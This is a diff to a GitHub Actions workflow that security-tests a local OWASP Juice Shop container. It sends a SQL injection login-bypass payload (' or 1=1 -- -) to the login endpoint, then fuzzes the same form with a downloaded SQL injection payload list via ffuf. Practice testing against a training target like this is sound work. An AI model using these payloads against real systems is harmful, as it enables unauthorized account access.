@@ -1,146 +1,64 @@
-name: fuzzing
+name: MyFuzzing
 
 on:
   push:
-  pull_request:
+    branches: [ main ]
   workflow_dispatch:
+
+permissions:
+  contents: write
+  pull-requests: write
+  security-events: write
+  actions: read
 
 jobs:
 
-  setup-target:
-    runs-on: ubuntu-latest
-    outputs:
-      base_url: ${{ steps.set.outputs.base_url }}
-
-    steps:
-      - name: Start Juice Shop
-        run: |
-          docker run -d -p 3000:3000 --name juice bkimminich/juice-shop
-          sleep 20
-
-      - name: Set base URL
-        id: set
-        run: echo "base_url=http://localhost:3000" >> $GITHUB_OUTPUT
-
   ffuf:
-    needs: setup-target
     runs-on: ubuntu-latest
+    services:
+        juice:
+          image: bkimminich/juice-shop
+          ports:
+            - 3000:3000
 
     steps:
-      - name: Install ffuf
+      - name: Wait for service
+        run: |
+            sleep 10 
+            curl --path-as-is -i -s -k -X $'POST' \
+              -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
+              --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
+              $'http://localhost:3000/rest/user/login'
+
+      - name: Install fuzzing
         run: |
           go install github.com/ffuf/ffuf/v2@latest
           echo "$HOME/go/bin" >> $GITHUB_PATH
 
-      - name: Run ffuf fuzzing
+      - name: Get payloads
         run: |
-          mkdir -p artifacts/ffuf
+          mkdir payloads
+          wget -O payloads/sqli.txt https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/SQL%20Injection/Intruder/SQL-Injection
+      
 
-          ffuf -u "${{ needs.setup-target.outputs.base_url }}/FUZZ" \
-               -w /usr/share/wordlists/dirb/common.txt \
-               -mc 200,204,301,302,307,401,403 \
-               -of json \
-               -o artifacts/ffuf/results.json
+      - name: Run ffuf login (email)
+        run: |
+          mkdir -p artifacts
+          ffuf -w payloads/sqli.txt -u 'http://localhost:3000/rest/user/login' -X POST -d 'email=FUZZ&password=pass' -fw 100 -o artifacts/ffuf.json
 
-      - name: Upload ffuf artifacts
+      - name: Save sample response diff 
+        run: |
+          jq '.results[:20]' artifacts/ffuf.json > artifacts/top_results.json
+
+      
+
+      - name: Get Logs from Service(docker)
+        run: |
+          docker logs $(docker ps -q --filter ancestor=bkimminich/juice-shop) > artifacts/juice-logs.log
+
+      
+      - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: ffuf-results
-          path: artifacts/ffuf
-
-  zap:
-    needs: setup-target
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Run ZAP baseline scan
-        run: |
-          mkdir -p artifacts/zap
-
-          docker run --rm \
-            -v $(pwd)/artifacts/zap:/zap/wrk \
-            ghcr.io/zaproxy/zaproxy:stable \
-            zap-baseline.py \
-            -t ${{ needs.setup-target.outputs.base_url }} \
-            -r report.html \
-            -J report.json
-
-      - name: Upload ZAP artifacts
-        uses: actions/upload-artifact@v4
-        with:
-          name: zap-results
-          path: artifacts/zap
-
-  boofuzz:
-    needs: setup-target
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Install boofuzz
-        run: pip install boofuzz requests
-
-      - name: Run boofuzz script
-        run: |
-          mkdir -p artifacts/boofuzz
-
-          cat << 'EOF' > fuzz.py
-          from boofuzz import *
-          import requests
-
-          def main():
-              session = Session(
-                  target=Target(
-                      connection=TCPSocketConnection("localhost", 3000)
-                  )
-              )
-          
-              s_initialize("login")
-          
-              s_string("POST /rest/user/login HTTP/1.1\r\n")
-              s_string("Host: localhost\r\n")
-              s_string("Content-Type: application/json\r\n\r\n")
-          
-              s_string('{"email":"admin@juice-sh.op","password":"')
-              s_string("FUZZ", fuzzable=True)
-              s_string('"}')
-          
-              session.connect(s_get("login"))
-              session.fuzz()
-          
-          if __name__ == "__main__":
-              main()
-          EOF
-
-          python fuzz.py || true
-
-      - name: Collect boofuzz logs
-        run: |
-          mv boofuzz-results/* artifacts/boofuzz/ || true
-
-      - name: Upload boofuzz artifacts
-        uses: actions/upload-artifact@v4
-        with:
-          name: boofuzz-results
-          path: artifacts/boofuzz
-
-  aggregate:
-    needs: [ffuf, zap, boofuzz]
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Download all artifacts
-        uses: actions/download-artifact@v4
-
-      - name: Merge reports
-        run: |
-          mkdir final-report
-
-          cp -r ffuf-results final-report/
-          cp -r zap-results final-report/
-          cp -r boofuzz-results final-report/
-
-      - name: Upload final report
-        uses: actions/upload-artifact@v4
-        with:
-          name: full-fuzz-report
-          path: final-report
+          name: security-reports-bundle
+          path: artifacts/
